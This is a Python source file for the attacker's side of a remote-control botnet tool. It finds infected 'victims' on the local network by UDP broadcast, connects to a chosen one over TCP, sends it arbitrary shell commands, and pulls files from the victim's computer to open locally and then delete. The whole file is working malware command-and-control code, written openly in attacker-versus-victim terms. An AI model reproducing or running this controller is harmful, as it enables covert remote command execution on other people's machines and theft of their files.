import socket
import datetime
import os

UDP_PORT = 32568
TCP_PORT = 32569

protocol = {
    "REQ": 8569,
    "RPY": 4586
}

"""
some files cant be read in the cml, so the server opens a file and inserts the data into it
"""
def view_file(command, data):
    file = open(".\\" + command[5:], "wb") # open a file with the same name as the one in the victim's computer
    file.write(data)
    file.close()
    os.system("start " + command[5:]) # open the file for reading
    input(">Del")
    os.system("del " + command[5:]) # when the attacker presses enter the file will be deleted


def search_bot(s, address):
    s.sendto(str(protocol["REQ"]).encode(), ("255.255.255.255", UDP_PORT)) # broadcasts the REQ packet to the agreed port
    t = int(datetime.datetime.now().strftime("%f"))
    while int(datetime.datetime.now().strftime("%f")) - t < 1000000:
        try:
            msg, addr = s.recvfrom(1024)
        except socket.timeout: # enters if more than 0.5 seconds pass
            break
        dec = str(protocol["RPY"])
        dec2 = msg.decode()
        if msg.decode().strip() == str(protocol["RPY"]).strip():
            if addr[0] not in address:
                address.append(addr[0])


def telnet():
    address = []
    udp_sock = socket.socket(family=socket.AF_INET, type=socket.SOCK_DGRAM)
    udp_sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
    udp_sock.settimeout(0.5)  # if the socket hasn't received anything
    # in half a second it will raise a timeout exception

    while True:
        s = socket.socket(family=socket.AF_INET, type=socket.SOCK_STREAM)
        search_bot(udp_sock, address)  # searching for new victims, only one second every time

        while len(address) == 0:
            search_bot(udp_sock, address)

        ''' printing all connected victims'''
        for x in range(0, len(address)):
            print(f"[{x + 1}] - {address[x]}")

        while 1:
            index = input(f"Select Victim: ")   # choosing the victim
            try:
                if int(index) <= len(address) and int(index) > 0:
                    break
            except ValueError:
                print("Enter an integer")
        s.connect((address[int(index) - 1], TCP_PORT))

        while 1:
            command = input("$>")   # entering the command
            if command == "return":   # in case of return we break
                break
            elif command == "":    # catching empty string
                continue
            s.send(command.encode())    # senfing the packet
            output = s.recv(4096)
            while len(output) >= 4096:
                output += s.recv(4096)
            if "read" == command[0:4]:    # catching the special command
                view_file(command, output)
                continue
            print(output.decode())
        address.remove(address[int(index) - 1])
        s.close()

if __name__ == '__main__':
    telnet()
